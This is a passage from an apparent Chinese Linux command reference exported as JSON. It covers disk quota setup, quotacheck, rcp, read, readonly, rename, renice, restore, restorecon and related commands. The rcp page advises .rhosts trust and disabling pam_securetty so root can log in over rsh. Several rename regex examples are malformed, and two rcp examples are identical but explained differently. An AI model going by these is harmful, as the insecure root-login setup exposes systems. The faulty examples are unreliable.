0\n```\n\n注意多了`usrquota,grpquota`，在`defaults,usrquota,grpquota`之间都没有空格，务必正确书写。这样就算加入了 quota 的磁盘格式了！不过，由于真正的 quota 在读取的时候是读取`/etc/mtab`这个文件的，而该文件需要重新开机之后才能够以/etc/fstab 的新数据进行改写！所以这个时候可以选择：重新开机 (reboot)。\n\n重新`remount filesystem`来驱动设定值。\n\n```shell\n[root@localhost ~]# umount /dev/hdb1\n[root@localhost ~]# mount -a\n[root@localhost ~]# grep '/disk2' /etc/mtab\n/dev/hdb1 /disk2 ext3 rw,usrquota,grpquota 0 0\n```\n\n事实上，也可以利用 mount 的 remount 功能。\n\n```shell\n[root@localhost ~]# mount -o remount /disk2\n```\n\n这样就已经成功的将 filesystem 的 quota 功能加入。\n\n扫瞄磁盘的使用者使用状况，并产生重要的 aquota.group 与 aquota.user：\n\n```shell\n[root@localhost ~]# quotacheck -avug\nquotacheck: Scanning /dev/hdb1 [/disk2] done\nquotacheck: Checked 3 directories and 4 files\n\n[root@localhost ~]# ll /disk2\n-rw-------  1 root root  6144 Sep  6 11:44 aquota.group\n-rw-------  1 root root  6144 Sep  6 11:44 aquota.user\n```\n\n使用 quotacheck 就可以轻易的将所需要的数据给他输出了！但奇怪的是，在某些 Linux 版本中，不能够以 aquota.user(group) 来启动quota ，可能是因为旧版 quota 的关系， 所以就另外做了一个 link 文件按来欺骗 quota，这个动作非必要。（主要是学习这个思维很重要）\n\n```shell\n[root@localhost ~]# cd /disk2\n[root@localhost ~]# ln -s aquota.user quota.user\n[root@localhost ~]# ln -s aquota.group quota.group\n```\n\n启动 quota 的限额：\n\n```shell\n[root@localhost ~]# quotaon -avug\n/dev/hdb1 [/disk2]: group quotas turned on\n/dev/hdb1 [/disk2]: user quotas turned on    ===>  看到turned on，才是真的成功！\n```\n\n编辑使用者的可使用空间：\n\n```shell\n[root@localhost ~]# edquota -u quser1\nDisk quotas for user quser1 (uid 502):\n  Filesystem    blocks    soft    hard   inodes   soft   hard\n  /dev/hdb1           0     45000    50000         0      0      0\n[root@localhost ~]# edquota -p quser1 quser2      ===>  直接复制给quser2\n```\n\n接下来要来设定宽限时间，还是使用 edquota\n\n```shell\n[root@localhost ~]# edquota -t\nGrace period before enforcing soft limits for users:\ntime units may be: days, hours, minutes, or seconds\n  Filesystem             Block grace period     Inode grace period\n  /dev/hdb1                     1days                  7days\n```\n\n使用`quota -v`来查询：\n\n```shell\n[root@localhost ~]# quota -vu quser1 quser2\nDisk quotas for user quser1 (uid 502):\n     Filesystem  blocks   quota      limit   grace   files   quota   limit   grace\n      /dev/hdb1         0    45000    50000                   0       0       0\nDisk quotas for user quser2 (uid 503):\n     Filesystem  blocks   quota      limit   grace   files   quota   limit   grace\n      /dev/hdb1         0    45000    50000                   0       0       0\n```\n\n注意，由于使用者尚未超过45 MB，所以 grace ( 宽限时间 ) 就不会出现。\n\n编辑群组可使用的空间：\n\n```shell\n[root@localhost ~]# edquota -g qgroup\nDisk quotas for group qgroup (gid 502):\n  Filesystem     blocks       soft       hard    inodes   soft   hard\n  /dev/hdb1            0      80000   90000           0      0      0\n\n[root@localhost ~]# quota -vg qgroup\nDisk quotas for group qgroup (gid 502):\n     Filesystem   blocks    quota      limit      grace    files   quota   limit   grace\n      /dev/hdb1         0     80000   90000                       0        0        0\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","quota"]},{"title":"【Linux 命令】quotacheck","url":"/linux-command/quotacheck/","content":"\n检查磁盘的使用空间与限制\n\n## 补充说明\n\n**quotacheck命令** 通过扫描指定的文件系统，获取磁盘的使用情况，创建、检查和修复磁盘配额（quota）文件。执行quotacheck指令，扫描挂入系统的分区，并在各分区的文件系统根目录下产生quota.user和quota.group文件，设置用户和群组的磁盘空间限制。\n\n如果在执行quotacheck命令时出现了以下信息：\n\n```shell\nquotacheck: Your kernel probably supports journaled quota but you are not using it. Consider switching to journaled quota to avoid running quotacheck after an unclean shutdown. \n```\n\n可以考虑将之前在文件系统的配置文件中添加的quota相关字段修改为：`usrjquota=aquota.user,grpjquota=aquota.group,jqfmt=vfsv1`，然后重新挂载文件系统：`mount -vo remount 挂载目录`（注意，如果这一步操作出现了任何问题，千万不要试图通过重启解决！将配置文件恢复原状是一个好的选择）\n\n###  语法\n\n```shell\nquotacheck(选项)(参数)\n```\n\n###  选项\n\n```shell\n-a：扫描在/etc/fstab文件里，有加入quota设置的分区；\n-c：对目标文件系统进行一次新的扫描，并创建新的quota文件；\n-d：详细显示指令执行过程，便于排错或了解程序执行的情形；\n-g：扫描磁盘空间时，计算每个群组识别码所占用的目录和文件数目；\n-R：排除根目录所在的分区；\n-u：扫描磁盘空间时，计算每个用户识别码所占用的目录和文件数目；\n-v：显示指令执行过程。\n```\n\n###  参数\n\n文件系统：指定要扫描的文件系统。\n\n###  实例\n\n将所有的在`/etc/mtab`内，含有quota支持的partition进行扫描：\n\n```shell\n[root@linux ~]# quotacheck -avug\nquotacheck: Scanning /dev/hdb1 [/disk2] done\nquotacheck: Checked 3 directories and 4 files\n```\n\n强制扫描已挂载的filesystem：\n\n```shell\n[root@linux ~]# quotacheck -avug -m\n```\n\n扫描指定的filesystem：\n\n```shell\n[root@linux ~]# quotacheck -cvug /disk2\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","quotacheck"]},{"title":"【Linux 命令】quotaoff","url":"/linux-command/quotaoff/","content":"\n关闭Linux内核中指定文件系统的磁盘配额功能\n\n## 补充说明\n\n**quotaoff命令** 用于关闭Linux内核中指定文件系统的磁盘配额功能。\n\n###  语法\n\n```shell\nquotaoff(选项)(参数)\n```\n\n###  选项\n\n```shell\n-a：关闭在/etc/fstab文件里，有加入quota设置的分区的空间限制；\n-g：关闭群组的磁盘空间限制；\n-u：关闭用户的磁盘空间限制；\n-v：显示指令执行过程。\n```\n\n###  参数\n\n文件系统：指定要关闭磁盘配额功能的文件系统。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","quotaoff"]},{"title":"【Linux 命令】quotaon","url":"/linux-command/quotaon/","content":"\n激活Linux内核中指定文件系统的磁盘配额功能\n\n## 补充说明\n\n**quotaon命令** 执行quotaon指令可开启磁盘对用户和群组的空间使用限制，但在开启前，各分区的文件系统根目录必须存在通过quotacheck命令创建的quota配置文件。\n\n###  语法\n\n```shell\nquotaon(选项)(参数)\n```\n\n###  选项\n\n```shell\n-a：开启在/ect/fstab文件里，有加入quota设置的分区的空间限制；\n-g：开启群组的磁盘空间限制；\n-u：开启用户的磁盘空间限制；\n-v：显示指令指令执行过程。\n```\n\n###  参数\n\n文件系统：指定要激活磁盘配额功能的文件系统。\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","quotaon"]},{"title":"【Linux 命令】rcconf","url":"/linux-command/rcconf/","content":"\nDebian Linux下的运行等级服务配置工具\n\n## 补充说明\n\n**rcconf命令** 是Debian Linux下的运行等级服务配置工具，用以设置在特定的运行等级下系统服务的启动配置。\n\n###  语法\n\n```shell\nrcconf(选项)\n```\n\n###  选项\n\n```shell\n--help：打印帮助信息；\n--dialog：使用对话命令显示菜单；\n--notermcheck：不按照终端属性来设置窗口尺寸。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","rcconf"]},{"title":"【Linux 命令】rcp","url":"/linux-command/rcp/","content":"\n使在两台Linux主机之间的文件复制操作更简单\n\n## 补充说明\n\n**rcp命令** 使在两台Linux主机之间的文件复制操作更简单。通过适当的配置，在两台Linux主机之间复制文件而无需输入密码，就像本地文件复制一样简单。\n\n###  语法 \n\n```shell\nrcp(选项)(参数)\n```\n\n###  选项 \n\n```shell\n-p：保留源文件或目录的属性，包括拥有者、所属群组、权限与时间；\n-r：递归处理，将指定目录下的文件与子目录一并处理；\n-x：加密两台Linux主机间传送的所有信息。\n-D：指定远程服务器的端口号。\n```\n\n同名用户的主目录。如果没有给出远程用户名，就使用当前用户名。如果远程机上的路径包含特殊shell字符，需要用反斜线`\\\\`、双引号`\"\"`或单引号`''`括起来，使所有的shell元字符都能被远程地解释。需要说明的是，rcp不提示输入口令，它通过rsh命令来执行拷贝。\n\ndirectory 每个文件或目录参数既可以是远程文件名也可以是本地文件名。远程文件名具有如下形式`rname@rhost:path`，其中rname是远程用户名，rhost是远程计算机名，path是这个文件的路径。\n\n###  参数 \n\n源文件：指定要复制的源文件。源文件可以有多个。\n\n###  实例 \n\n **rcp命令使用条件** \n\n如果系统中有`/etc/hosts`文件，系统管理员应确保该文件包含要与之进行通信的远程主机的项。配置过程:\n\n只对root用户生效\n\n1、在双方root用户根目录下建立rhosts文件，并将双方的hostname加进去。在此之前应在双方的`/etc/hosts`文件中加入对方的ip和hostname  \n2、把rsh服务启动起来，redhat默认是不启动的。  \n方法：用执行ntsysv命令，在rsh选项前用空格键选中，确定退出。然后执行`service xinetd restart`即可。  \n3、到`/etc/pam.d/`目录下，把rsh文件中的`auth required /lib/security/pam_securetty.so`一行用“#”注释掉即可。（只有注释掉这一行，才能用root用户登录）\n\n **将当前目录下的 test1 复制到名为 webserver1 的远程系统：** \n\n```shell\nrcp test1 webserver1:/home/root/test3\n```\n\n在这种情况下，test1 被复制到远程子目录 test3下，名称仍为 test1 。如果仅提供了远程主机名，rcp 将把 test1 复制到远程主目录下，名称仍为 test1 。\n\n **还可以在目的目录中包含文件名。例如，将文件复制到名为 webserver1的系统中：** \n\n```shell\nrcp test1 webserver1:/home/root/test3\n```\n\n在这种情况下，将 test1 复制到远程目录root 下并将其命名为 test3。\n\n **从远程系统复制文件：要将远程系统中的文件复制到本地目录下：** \n\n```shell\nrcp remote_hostname:remote_file local_fileEnter\n```\n\n **将远程系统 webserver1中的 test2 复制到当前目录：** \n\n```shell\nrcp webserver1:/home/root/test2 .Enter\n```\n\n`.`是“当前目录”的简写形式。在这种情况下，远程目录中的 test2 被复制到当前目录下，名称仍为 test2 。\n\n如果希望用新名称复制文件，请提供目标文件名。如果希望将 test2 复制到本地系统中的其他目录下，请使用以下绝对或相对路径名：\n\n```shell\nrcp webserver1:/home/root/test2 otherdir/ Enter\n```\n\n或者，如果希望用其他文件名将文件复制到其他目录下：\n\n```shell\nrcp webserver1:/home/root/test2 otherdir/otherfile Enter\n```\n\n **将目录复制到远程系统：** \n\n要将本地目录及其文件和子目录复制到远程系统，请同时使用 rcp 和 -r（递归）选项。\n\n```shell\nrcp -r local_dir remote_hostname:remote_dir Enter\n```\n\n如果当前目录下没有 local_dir，则除本地目录名外，还需要提供相对路径名（自当前目录开始）或绝对路径名（自 / 顶级目录开始）。另外，如果主目录下没有 remote_dir，则 remote_dir 将需要一个相对路径（自主目录开始）或绝对路径（自 / 开始）。\n\n **要将名为 work 的子目录完整地复制到 webserver1远程计算机中的主目录下名为 products 的目录，请键入以下内容：** \n\n```shell\nrcp -r work webserver1:/home/root/products Enter\n```\n\n此命令在`webserver1:/home/root/products`下创建名为 work 的目录及其全部内容（假定`/home/root/products`已存在于 webserver1中）。\n\n本示例假定用户处于包含 work 的本地目录下。否则，必须提供该目录的相对或绝对路径，如`/home/root/work`。\n\n **从远程系统复制目录：** \n\n要将远程目录及其所有文件和子目录复制到本地目录，请在以下语法中使用 rcp 和 -r（递归）选项。\n\n```shell\nrcp –r remote_hostname:remote_dir local_dir Enter\n```\n\n要将名为 work 的远程目录复制到当前目录，请键入以下内容：\n\n```shell\nrcp –r webserver1:/home/root/work .Enter\n```\n\n`.`表示当前目录。将在此目录下创建 work 目录。\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","rcp"]},{"title":"【Linux 命令】read","url":"/linux-command/read/","content":"\n从键盘读取变量值\n\n## 补充说明\n\n**read命令** 从键盘读取变量的值，通常用在shell脚本中与用户进行交互的场合。该命令可以一次读取多个变量的值，变量和输入的值都需要使用空格隔开。在read命令后面，如果没有指定变量名，读取的数据将被自动赋值给特定的变量REPLY\n\n###  语法\n\n```shell\nread(选项)(参数)\n```\n\n###  选项\n\n```shell\n-p：指定读取值时的提示符；\n-t：指定读取值时等待的时间（秒）。\n```\n\n###  参数\n\n变量：指定读取值的变量名。\n\n###  实例\n\n下面的列表给出了read命令的常用方式：\n\n```shell\nread 1987name\n从标准输入读取输入并赋值给变量1987name。\n```\n\n```shell\nread first last\n从标准输入读取输入到第一个空格或者回车，将输入的第一个单词放到变量first中，并将该行其他的输入放在变量last中。\n```\n\n```shell\nread\n从标准输入读取一行并赋值给特定变量REPLY。\n```\n\n```shell\nread -a arrayname\n把单词清单读入arrayname的数组里。\n```\n\n```shell\nread -p \"text\"\n打印提示（text），等待输入，并将输入存储在REPLY中。\n```\n\n```shell\nread -r line\n允许输入包含反斜杠。\n```\n\n```shell\nread -t 3\n指定读取等待时间为3秒。\n```\n\n```shell\nread -n 2 var\n从输入中读取两个字符并存入变量var，不需要按回车读取。\n```\n\n```shell\nread -d \":\" var\n用定界符“:”结束输入行。\n```\n\n## read命令示例  \n\n从标准输入读取输入并赋值给变量1987name。\n\n```shell\n#read 1987name        #等待读取输入，直到回车后表示输入完毕，并将输入赋值给变量answer\nHelloWorld            #控制台输入Hello\n\n#echo $1987name       #打印变量\nHelloWorld\n```\n\n等待一组输入，每个单词之间使用空格隔开，直到回车结束，并分别将单词依次赋值给这三个读入变量。\n\n```shell\n#read one two three\n1 2 3                   #在控制台输入1 2 3，它们之间用空格隔开。\n\n#echo \"one = $one, two = $two, three = $three\"\none = 1, two = 2, three = 3\n```\n\nREPLY示例\n\n```shell\n#read                  #等待控制台输入，并将结果赋值给特定内置变量REPLY。\nThis is REPLY          #在控制台输入该行。 \n\n#echo $REPLY           #打印输出特定内置变量REPLY，以确认是否被正确赋值。\n\nThis is REPLY\n```\n\n-p选项示例\n\n```shell\n#read -p \"Enter your name: \"            #输出文本提示，同时等待输入，并将结果赋值给REPLY。\nEnter you name: stephen                 #在提示文本之后输入stephen\n\n#echo $REPLY\nstephen\n```\n\n等待控制台输入，并将输入信息视为数组，赋值给数组变量friends，输入信息用空格隔开数组的每个元素。\n\n```shell\n#read -a friends\nTim Tom Helen\n\n#echo \"They are ${friends[0]}, ${friends[1]} and ${friends[2]}.\"\nThey are Tim, Tom and Helen.\n```\n\n **补充一个终端输入密码时候，不让密码显示出来的例子。** \n\n方法1：\n\n```shell\n#!/bin/bash\nread -p \"输入密码：\" -s pwd\necho\necho password read, is \"$pwd\"\n```\n\n方法2：\n\n```shell\n#!/bin/bash\nstty -echo\nread -p \"输入密码：\" pwd\nstty echo\necho\necho 输入完毕。\n```\n\n其中，选项`-echo`禁止将输出发送到终端，而选项`echo`则允许发送输出。\n\n使用read命令从键盘读取变量值，并且将值赋给指定的变量，输入如下命令：\n\n```shell\nread v1 v3          #读取变量值\n```\n\n执行上面的指令以后，要求键入两个数据，如下所示：\n\n```shell\nLinux c+            #输入数据\n```\n\n完成之后，可以使用echo命令将指定的变量值输出查看，输入如下命令：\n\n```shell\necho $v1 $v3       #输出变量的值\n```\n\n执行输出变量值的命令以后，将显示用户所输入的数据值，如下所示：\n\n```shell\nLinux c+           #输出变量值\n```\n\n注意：使用echo命令输出变量值时，必须在变量名前添加符号`$`。否则，echo将直接输出变量名。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","read"]},{"title":"【Linux 命令】readonly","url":"/linux-command/readonly/","content":"\n标记shell变量或函数为只读\n\n## 语法\n\n```shell\nreadonly [-aAf] [name[=value] ...]\nreadonly -p\n```\n\n## 主要用途\n\n- 定义一到多个变量并设置只读属性。\n- 为已定义的一到多个变量设置只读属性。\n- 显示全部包含只读属性的变量。\n- 为已定义的一到多个函数设置只读属性。\n- 显示全部包含只读属性的函数。\n\n## 选项\n\n```shell\n-a：指向数组。\n-A：指向关联数组。\n-f：指向函数。\n-p：显示全部只读变量。\n--：在它之后的选项无效。\n```\n\n## 参数\n\n```shell\nname（可选）：变量名或函数名\nvalue（可选）：变量的值\n```\n\n### 返回值\n\nreadonly返回true除非你提供了非法选项或非法名称。\n\n## 例子\n\n```shell\n# 定义变量并增加只读属性\nreadonly var1=13 var2\nreadonly -a arr1=(1 2 3 4 5) arr2=('z' 'x' 'c')\n# 必须有 '-A' 选项\nreadonly -A dict1=(['key1']='value1')\n```\n\n```shell\n# 先定义变量、函数，然后再为它们添加只读属性\nmax=3\nreadonly max\n\n# 数组定义时可以不加 `declare -a`\nseasons=('spring' 'summer' 'autumn' 'winter')\n# 为数组添加只读属性时可以不加 `-a` 选项\nreadonly seasons\n\ndeclare -A man=(['age']=23 ['height']='190cm')\n# 为关联数组添加只读属性时可以不加 `-A` 选项\nreadonly man\n\nfunction foo(){ echo 'bar'; }\n# 为函数添加只读属性时必须加 `-f` 选项\nreadonly -f foo\n```\n\n```shell\n# 显示全部只读变量，以下两个命令的显示结果一样\nreadonly\nreadonly -p\n# 显示全部拥有只读属性的数组\nreadonly -a\n# 显示全部拥有只读属性的关联数组\nreadonly -A\n# 显示全部拥有只读属性的函数\nreadonly -f\n```\n\n## 常见错误\n\n对于只读变量而言，若用户对其值进行修改，则会立即报错。例如，使用该指令定义一个只读变量\"test\"，并且将其值初始化为\"ok\"，输入如下命令：\n\n```shell\n[root@localhost ~]# readonly test='ok'        #定义只读变量并初始化 \n```\n\n那么当用户直接修改该只读变量时就会报错，如下所示：\n\n```shell\n[root@localhost ~]# test='my'                 #试图修改只读变量的值\n-bash: test: readonly variable\n```\n\n当用户试图修改只读变量的值时，会被提示该变量为只读变量。\n\n## 注意\n\n1. 该命令是bash内建命令，相关的帮助信息请查看`help`命令。\n2. `declare +r`不能去除只读属性， `unset`不能删除只读变量。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","readonly"]},{"title":"【Linux 命令】reboot","url":"/linux-command/reboot/","content":"\n重新启动正在运行的Linux操作系统\n\n## 补充说明\n\n**reboot命令** 用来重新启动正在运行的Linux操作系统。\n\n### 语法\n\n```shell\nreboot(选项)\n```\n\n### 选项\n\n```shell\n-d：重新开机时不把数据写入记录文件/var/tmp/wtmp。本参数具有“-n”参数效果；\n-f：强制重新开机，不调用shutdown指令的功能；\n-i：在重开机之前，先关闭所有网络界面；\n-n：重开机之前不检查是否有未结束的程序；\n-w：仅做测试，并不真正将系统重新开机，只会把重开机的数据写入/var/log目录下的wtmp记录文件。\n```\n\n### 实例\n\n```shell\nreboot        //重开机。\nreboot -w     //做个重开机的模拟（只有纪录并不会真的重开机）。\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","reboot"]},{"title":"【Linux 命令】reject","url":"/linux-command/reject/","content":"\n指示打印系统拒绝发往指定目标打印机的打印任务\n\n## 补充说明\n\n**reject命令** 属于CUPS套件，用于指示打印系统拒绝发往指定目标打印机的打印任务。\n\n###  语法\n\n```shell\nreject(选项)(参数)\n```\n\n###  选项\n\n```shell\n-E：当连接到服务器时强制使用加密；\n-U：指定连接服务器时使用的用户名；\n-h：指定连接服务器名和端口号；\n-r：指定拒绝打印任务的原因。\n```\n\n###  参数\n\n目标：指定目标打印机。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","reject"]},{"title":"【Linux 命令】rename","url":"/linux-command/rename/","content":"\n用字符串替换的方式批量改变文件名\n\n## 补充说明\n\nrename命令存在两个版本用法上有所区别 \n\n```bash\nC语言版本, 支持通配符\n[常用通配符说明]\n?    表示一个任意字符\n*    表示一个或一串任意字符\n\nPerl版本, 支持正则表达式\n[常用正则表达式符号说明]\n^    匹配输入的开始位置\n$    匹配输入的结尾\n.    匹配除换行符外的任意字符\n+    匹配前一个字符一次或多次 例如，\"zo+\"可以匹配\"zoo\",但不匹配\"z\"\n[a-z]    表示某个范围内的字符，例如，\"[a-z]\"匹配\"a\"与\"z\"之间的任何一个小写字母字符。\n[^m-z]    否定的字符区间。与不在指定区间内的字符匹配。\n```\n\n区分方法: `rename --version`\n\n如果返回结果中包含 **util-linux** , 说明是C语言版本, 反之是Perl版本\n```bash\n# Perl版本 | Ubuntu(18),Mint(20)默认的是Perl版本\n$ rename --version\n/usr/bin/rename using File::Rename version 1.10\n\n# C语言版本 | Centos(7)默认的是C语言版本\n$ rename --version\nrename，来自 util-linux 2.23.2\n```\n\n\n###  语法\n\n```bash\n# Perl版本\nrename [ -h|-m|-V ] [ -v ] [ -0 ] [ -n ] [ -f ] [ -d ] [ -e|-E perlexpr]*|perlexpr [ files ]\n\n# C语言版本\nrename [选项] 表达式 替换的字符 文件...\n```\n\n###  参数\n\n```bash\n# Perl版本\n-v, --verbose\n        详细：成功重命名的文件的打印名称。\n\n-0, --null\n        从STDIN读取时，请使用\\0作为记录分隔符\n\n-n, --nono\n        不执行任何操作：打印要重命名的文件名，但不重命名。\n\n-f, --force\n        覆盖：允许覆盖现有文件\n\n--path, --fullpath\n        重命名完整路径：包括任何目录组件。默认\n\n-d, --filename, --nopath, --nofullpath\n        不重命名目录：仅重命名路径的文件名部分\n\n-h, --help\n        帮助：打印提要和选项。\n\n-m, --man\n        手册: 打印手册页.\n\n-V, --version\n        版本: 显示版本号.\n\n-e      表达: 作用于文件名的代码.\n\n        可以重复来构建代码（比如“perl-e”）。如果没有-e，则第一个参数用作代码。\n\n-E      语句：对文件名执行操作的代码，如-e，但终止于 ';'.\n\n\n# C语言版本\n-v, --verbose\n        提供视觉反馈，其中重命名了哪些文件（如果有的话）\n\n-V, --version\n        显示版本信息并退出。\n\n-s, --symlink\n        在符号链接目标上执行重命名\n\n-h, --help\n        显示帮助文本并退出\n```\n\n###  实例\n\n---\n\n#### Perl版本\n\n将1.txt 2.txt重命名为1.log 2.log\n\n```bash\n$ rename -v \"s/txt/log/g\" 1.txt 2.txt\n1.txt renamed as 1.log\n2.txt renamed as 2.log\n```\n\n修改文件的后缀\n\n```bash\nrename \"s//.html//.php/\" *     # 把.html 后缀的改成 .php后缀\n```\n\n批量添加文件后缀\n\n```bash\nrename \"s/$//.txt/\" *  # 把所有的文件名都以txt结尾\n```\n\n批量删除文件名\n\n```bash\nrename \"s//.txt//\" *   # 把所有以.txt结尾的文件名的.txt删掉\n```\n\n---\n\n##### C语言版本\n\n\n将1.txt 2.txt重命名为1.log 2.log\n\n```bash\n$ rename -v txt log 1.txt 2.txt\n`1.txt' -> `1.log'\n`2.txt' -> `2.log'\n```\n\n文件夹中有这些文件foo1, ..., foo9, foo10, ..., foo278\n```bash\n# 把foo1到foo9的文件重命名为foo01到foo09，重命名的文件只是有4个字符长度名称的文件，文件名中的foo被替换为foo0。\nrename foo foo0 foo?\n\n# foo01到foo99的所有文件都被重命名为foo001到foo099，只重命名5个字符长度名称的文件，文件名中的foo被替换为foo0。\nrename foo foo0 foo??\n\n# foo001到foo278的所有文件都被重命名为foo0001到foo0278，所有以foo开头的文件都被重命名。\nrename foo foo0 foo*\n\n# 从foo0200到foo0278的所有文件都被重命名为foo200到foo278，文件名中的foo0被替换为foo。\nrename foo0 foo foo0[2]*\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","rename"]},{"title":"【Linux 命令】renice","url":"/linux-command/renice/","content":"\n修改正在运行的进程的调度优先级\n\n## 补充说明\n\n**renice命令** 可以修改正在运行的进程的调度优先级。预设是以程序识别码指定程序调整其优先权，您亦可以指定程序群组或用户名称调整优先权等级，并修改所有隶属于该程序群组或用户的程序的优先权。只有系统管理者可以改变其他用户程序的优先权，也仅有系统管理者可以设置负数等级。\n\n###  语法\n\n```shell\nrenice(选项)(参数)\n```\n\n###  选项\n\n```shell\n-g：指定进程组id；\n-p<程序识别码>：改变该程序的优先权等级，此参数为预设值。\n-u：指定开启进程的用户名。\n```\n\n###  参数\n\n进程号：指定要修改优先级的进程。\n\n###  实例\n\n将行程id为987及32的行程与行程拥有者为daemon及root的优先序号码加1：\n\n```shell\nrenice 1 987 -u daemon root -p 32\n```\n\n注意：每一个行程都有一个唯一的id。\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","renice"]},{"title":"【Linux 命令】repquota","url":"/linux-command/repquota/","content":"\n报表的格式输出磁盘空间限制的状态\n\n## 补充说明\n\n**repquota命令** 以报表的格式输出指定分区，或者文件系统的磁盘配额信息。\n\n###  语法\n\n```shell\nrepquota(选项)(参数)\n```\n\n###  选项\n\n```shell\n-a：列出在/etc/fstab文件里，有加入quota设置的分区的使用状况，包括用户和群组；\n-g：列出所有群组的磁盘空间限制；\n-u：列出所有用户的磁盘空间限制；\n-v：显示该用户或群组的所有空间限制。\n```\n\n###  参数\n\n文件系统：要打印报表的文件系统或者对应的设备文件名。\n\n###  实例\n\n显示所有文件系统的磁盘使用情况\n\n```shell\nrepquota -a\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","repquota"]},{"title":"【Linux 命令】resize","url":"/linux-command/resize/","content":"\n命令设置终端机视窗的大小\n\n## 补充说明\n\n**resize命令** 命令设置终端机视窗的大小。执行resize指令可设置虚拟终端机的视窗大小。\n\n###  语法\n\n```shell\nresize [-cu][-s <列数> <行数>]\n```\n\n###  选项\n\n```shell\n-c 　就算用户环境并非C Shell，也用C Shell指令改变视窗大小。\n-s <列数> <行数> 　设置终端机视窗的垂直高度和水平宽度。\n-u 　就算用户环境并非Bourne Shell，也用Bourne Shell指令改变视窗大小。\n```\n\n### 实例\n\n使用 C shell\n\n```shell\n[root@localhost ~]# resize -c\nset noglob;\nsetenv COLUMNS '99';\nsetenv LINES '34';\nunset noglob;\n```\n\n\n使用 Bourne shell\n\n```shell\n[root@localhost ~]# resize -u\nCOLUMNS=99;\nLINES=34;\nexport COLUMNS LINES;\n```\n\n设置指定大小\n\n```shell\n[root@localhost ~]# resize -s 80 160\n```\n\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","resize"]},{"title":"【Linux 命令】restore","url":"/linux-command/restore/","content":"\n所进行的操作和dump指令相反\n\n## 补充说明\n\n**restore命令** 是dump命令的逆过程，用于还原dump命令生成的备份文件。倾倒操作可用来备份文件，而还原操作则是写回这些已备份的文件。\n\n###  语法\n\n```shell\nrestore(选项)\n```\n\n###  选项\n\n```shell\n-b<区块大小>：设置区块大小，单位为Byte；\n-c：不检查倾倒操作的备份格式，仅准许读取使用旧格式的备份文件；\n-C：使用对比模式，将备份的文件与现行的文件相互对比；\n-D<文件系统>：允许用户指定文件系统的名称；\n-f<备份文件>：从指定的文件中读取备份数据，进行还原操作；\n-h：仅解除目录而不包括与该目录相关的所有文件；\n-i：使用互动模式，在进行还原操作时，restore指令将依序询问用户；\n-m：解开符合指定的inode编号的文件或目录而非用文件名称指定；\n-r：进行还原操作；\n-R：全面还原文件系统时，检查应从何处开始进行；\n-s<文件编号>：当备份数据超过一卷磁带时，用户可以指定备份文件的编号；\n-t：指定文件名称，若该文件已存在备份文件中，则列出它们的名称；\n-v：显示指令执行过程；\n-x：设置文件名称，且从指定的存储媒体里读入它们，若该文件已存在在备份文件中，则将其还原到文件系统内；\n-y：不询问任何问题，一律以同意回答并继续执行指令。\n```\n\n###  实例\n\n```shell\ndump -9 -u -f /dev/hda3 /home/frank/\n```\n\n用restore命令来恢复备份：\n\n```shell\nrestore rf /dev/hda3 /home/frank\n```\n\n用restore命令来查看备份文件里的文件列表：\n\n```shell\nrestore ft /dev/hda3\n```\n\n\n","categories":["Linux 命令"],"tags":["Linux","Linux Command","Linux 命令","restore"]},{"title":"【Linux 命令】restorecon","url":"/linux-command/restorecon/","content":"\n恢复文件的安全上下文\n\n## 补充说明\n\n**restorecon命令** 用来恢复SELinux文件属性即恢复文件的安全上下文。\n\n###  语法\n\n```shell\nrestorecon [-iFnrRv] [-e excludedir ] [-o filename ] [-f filename | pathname...]\n```\n\n###  选项\n\n```shell\n-i：忽略不存在的文件。\n-f：infilename 文件 infilename 中记录要处理的文件。\n-e：directory 排除目录。\n-R/-r：递归处理目录。\n-n：不改变文件标签。\n-o/outfilename：保存文件列表到 outfilename，在文件不正确情况下。\n-v：将过程显示到屏幕上。\n-F：强制恢复文件安全语境。\n```\n\n###  实例\n\n假设CentOS安装了apache，网页默认的主目录是`/var/www/html`，我们经常遇到这样的问题，在其他目录中创建了一个网页文件，然后用mv移动到网页默认目录`/var/www/html`中，但是在浏览器中却打不开这个文件，这很可能是因为这个文件的SELinux配置信息是继承原来那个目录的，与`/var/www/html`目录不同，使用mv移动的时候，这个SELinux配置信息也一起移动过来了，从而导致无法打开页面，具体请看下面的实例：\n\n使用CentOS举例,如果默认没有安装apache，确保网络连接，使用下面的命令安装\n\n```shell\n[root@jsdig.com ~]# yum install httpd\n # 我们在root的家目录新建一个html文件 \n[root@jsdig.com ~]# pwd\n/root\n\n[root@jsdig.com ~]# vi index.html\n\n# 随便输入一段文字，保存退出 \nwelcome to www.jsdig.com\n\n# 将这个文件mv到网页默认目录下 \n[root@jsdig.com ~]# mv index.html /var/www/html/\n\n# \n# 这个时候我们使用firefox浏览器输入127.0.0.1/index.html发现打不开，\n# 查看一下SELinux的日志文件，发现了下面这一段报错信息，从这个报错信息不难看出，\n# 进程httpd访问网页主目录中的index.html时被SELinux阻止，原因是因为，SELinux配置信息不正确,\n# 正确的SELinux配置信息应该是scontext=后面的部分，\n# 而index.html文件的SELinux配置信息却是tcontext=后面的部分，\n# 从tcontext=的第三段“admin_home_t”不难看出，这个文件的SELinux配置信息是root用户家目录的。\n# \ntype=AVC msg=audit(1378974214.610:465): avc:  denied  { open } for  pid=2359 comm=\"httpd\" path=\"/var/www/html/index.html\" dev=\"sda1\" ino=1317685 scontext=system_u:system_r:httpd_t:s0 tcontext=unconfined_u:object_r:admin_home_t:s0 tclass=file\n```\n\n使用ls 